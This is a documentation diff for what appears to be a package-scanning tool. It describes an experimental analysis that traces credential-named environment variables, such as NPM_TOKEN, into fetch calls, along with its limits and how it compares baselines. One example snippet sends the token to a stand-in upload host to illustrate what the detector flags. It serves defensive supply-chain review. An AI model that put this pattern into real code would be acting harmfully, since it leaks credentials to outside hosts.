@@ -782,3 +782,54 @@ SHA before writing, but GitHub comment updates are not atomic with that check.
 Use the standard `github.token`; custom bot identities are not supported.
 Comments are optional and require a commit containing this feature: the
 example's existing release pin intentionally remains unchanged.
+
+
+## Credential flows to fetch
+
+Experimental `--deep` scans record local static value paths from credential-shaped
+`process.env` names to the global `fetch` function. For example:
+
+```js
+const token = process.env.NPM_TOKEN;
+const payload = token;
+fetch('https://example.test/upload', { body: payload });
+```
+
+The manifest's `credentialFlows` includes the source name, sink argument, and
+original file, line and snippet for the source, alias uses and sink. JSON review
+entries retain current paths and each baseline candidate's paths separately.
+Markdown shows current paths; SARIF retains them in result properties and text.
+No dependency code is executed.
+
+The analyzer follows immutable local `const` aliases, string concatenation and
+template interpolation within one function (or at module scope). It recognizes
+credential values in the URL, an inline options object's `body`, and inline
+`headers` values. Lexical shadowing, binding reassignment and supported TypeScript
+wrappers use the same rules as the import analyzer. Duplicate object keys follow
+last-property semantics; spreads, getters and unresolved keys prevent object
+attribution. The source name is a credential naming heuristic, not proof its value
+is a secret.
+
+A newly observed path requires review even if the package already had the same
+network and environment indicators. Comparison uses the file, credential name,
+sink API and argument, including occurrence counts. Formatting, line shifts and
+local alias renaming alone do not create new paths. Moving a path to another
+function in the same file with the same signature and count is not distinguished.
+A baseline without this field yields `credential-flow-unreviewed` when paths are
+found; rescan both versions with the same engine to compare them.
+
+This first version does not follow mutable variables, object aliases, destructured
+credential values, user function calls, cross-function or cross-file flows,
+credential files, imported HTTP clients, or encodings and other transformations.
+Control-flow feasibility and runtime mutation through unknown calls are not
+modeled. Files with recognized environment-property writes omit flow attribution
+and record `environment-mutation` in `credentialFlows.errors`. Source or parser
+failures and skipped files count toward `filesUnavailable`. Absence of paths is
+inconclusive. A recorded path does not prove execution, transmission or malicious
+intent; authentication code may legitimately produce findings.
+
+Flow tracing shares the isolated AST worker's five-second deadline. It also has
+limits of 10,000 tracing visits, depth 32, 100 findings per file and 200 per package.
+Exceeding those limits marks the scan incomplete and prevents approval. Basic
+scanning has no flow field and still requires no parser. These changes update the
+engine fingerprint, so existing baselines need review.
